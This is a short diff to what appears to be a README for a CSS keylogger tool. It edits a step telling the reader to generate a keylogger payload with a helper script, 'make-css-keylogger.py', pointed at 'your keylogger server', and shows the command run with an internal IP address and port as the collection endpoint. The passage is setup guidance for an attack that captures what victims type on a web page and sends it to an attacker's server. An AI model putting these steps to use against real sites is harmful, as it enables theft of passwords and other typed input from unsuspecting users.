@@ -11,7 +11,7 @@ pip install -r requirements.txt
 
 Now follow these instructions:
 
-- Generate css keylogger payload using the helper script `make-css-keylogger.py` providing your .
+- Generate css keylogger payload using the helper script `make-css-keylogger.py` providing the endpoint for your keylogger server (keep reading, it will make sense)
 
     ```
     python make-css-keylogger.py http://172.22.209.203:3000
